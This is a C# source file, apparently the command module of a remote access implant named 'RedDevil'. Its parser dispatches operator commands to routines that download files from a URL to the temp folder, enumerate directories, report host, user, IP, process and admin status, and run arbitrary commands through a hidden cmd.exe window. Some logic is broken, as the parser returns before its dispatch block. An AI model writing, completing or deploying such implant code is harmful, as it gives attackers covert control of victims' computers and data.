using System;
using System.Linq;

namespace RedDevil
{
    class Operations
    {
        GeneralInfo ninstance = new GeneralInfo();

        // Constructor
        public Operations(GeneralInfo instance){
            ninstance = instance;
        }

        // function
        public String CommandParser(String cmd){

            string command = "";
            string argument = "";

            if(cmd.Contains(" ")){
                    command = cmd.Split(" ")[0];
                    argument = cmd.Split(" ")[1];
            }
            else{
                command = cmd;
            }
            return "";

            // This section is incharge of collecting commands 
            // and parsinf to the respected function
            //incharge to carry out the command
            

            if( command.Contains("download"))
            {
                DownloadFile(argument);
            }
            else if( command.Contains("cd")){
                SetWorkingDirectory(argument);
            }
            else if( command.Contains("ls")){
                EnumWorkingDirectory(argument);
            }
            else if( command.Contains("hostname")){
                GetHostName();
            }
            else if( command.Contains("osinfo")){
                GetOsInfo();
            }
            else if( command.Contains("username")){
                GetUserName();
            }
            else if( command.Contains("ipaddress")){
                GetIpv4Address();
            }
            else if( command.Contains("processname")){
                GetProcessInfo();
            }
            else if( command.Contains("pwd")){
                GetWorkingDirectory();
            }
            else if( command.Contains("privileges")){
                GetPrivileges();
            }
            else if( command.Contains("exepath")){
                GetExePath();
            }
            else{
                ExecuteCMD(cmd);
            }

        }

        // function to download file from a specific url to users machine
        public string DownloadFile(string url)
        {
            try{
            System.Net.WebClient wInstance = new System.Net.WebClient();
            string tempPath = System.IO.Path.GetTempPath(); // returns file current dirctory
            string fileName = url.Split('/')[url.Split('/').Length-1]; 
            string savePath = tempPath + fileName;

            wInstance.DownloadFile(url, savePath);
            return "File has been downloaded to: " + savePath;
            }
            catch(Exception e){
                return e.Message.ToString();
            }
        }

        public string SetWorkingDirectory(string path){
            try
            {
                System.IO.Directory.SetCurrentDirectory(path);
                return "Directory chnaged";
            }
            catch (Exception e)
            {
                return e.Message.ToString();
            }
            
        }

        // Function to enumarete working directory
        public string EnumWorkingDirectory(string path){
            try{
                if( path == "")
                {
                    path = ninstance.cDirectory;
                }
                System.Text.StringBuilder sbInstance = new System.Text.StringBuilder();
                var dirs = from line in System.IO.Directory.EnumerateDirectories(path) select line;

                foreach(var dir in dirs)
                {
                    sbInstance.Append(dir);
                    sbInstance.Append(Environment.NewLine);
                }


                var files = from line in System.IO.Directory.EnumerateFiles(path) select line;

                foreach(var file in files)
                {
                    sbInstance.Append(file);
                    sbInstance.Append(Environment.NewLine);
                }

                string DirAndFile = sbInstance.ToString();

                return DirAndFile;
            }
            catch(Exception e){
                return e.Message.ToString();

            }
        }

            //this function is in charge of running commands that are not
            //in our list. It will use cmd.exe silently
        public string ExecuteCMD(string command){
            try
            {
                string results = "";

                System.Diagnostics.Process pInstance = new System.Diagnostics.Process();
                pInstance.StartInfo.FileName = "cmd.exe"; // program to be run
                pInstance.StartInfo.Arguments = "/" + command; // Arguments that are taken
                pInstance.StartInfo.UseShellExecute = false; // starts the process directly from the executable file. No shell use
                pInstance.StartInfo.CreateNoWindow = true; // make sure theres no window popup
                pInstance.StartInfo.WorkingDirectory = ninstance.cDirectory; // Set our working directory
                pInstance.StartInfo.RedirectStandardOutput = true; // recieve output
                pInstance.StartInfo.RedirectStandardError = true; // get error logs
                pInstance.Start(); // start program

                results += pInstance.StandardOutput.ReadToEnd();
                results += pInstance.StandardError.ReadToEnd();


                return results;
            }
            catch (Exception e)
            {
                return e.Message.ToString();
            }
            
        }


        /*  try
            {
                
            }
            catch (Exception e){
                return e.Message.ToString();
            }
            
               */


        //Functions to fetch General info
        public String GetHostName(){
            try
            {
                return ninstance.hostName;
            }
            catch (Exception e)
            {
                return e.Message.ToString();
            }
            
        }
        public string GetUserName(){
            try
            {
                return ninstance.uName;
            }
            catch (Exception e){
                return e.Message.ToString();
            }
            
        }
        public string GetIpv4Address(){
            try
            {
                return ninstance.ipv4Addres;
            }
            catch (Exception e){
                return e.Message.ToString();
            }
            
        }
        public string GetProcessInfo(){
            try
            {
                return ninstance.pName + " " + ninstance.pid;
            }
            catch (Exception e){
                return e.Message.ToString();
            }
            
        }
        public string GetPrivileges(){
            try
            {
                return ninstance.isadmin.ToString();
            }
            catch (Exception e){
                return e.Message.ToString();
            }
            
        }
        public string GetWorkingDirectory(){
            try
            {
                return ninstance.cDirectory;
            }
            catch (Exception e){
                return e.Message.ToString();
            }
            
        }
        public string GetExePath(){
            try
            {
                return ninstance.ePath;
            }
            catch (Exception e){
                return e.Message.ToString();
            }
            
        }
        public string GetOsInfo(){
            try
            {
                return ninstance.oSystem;
            }
            catch (Exception e){
                return e.Message.ToString();
            }
            
        }
    }
}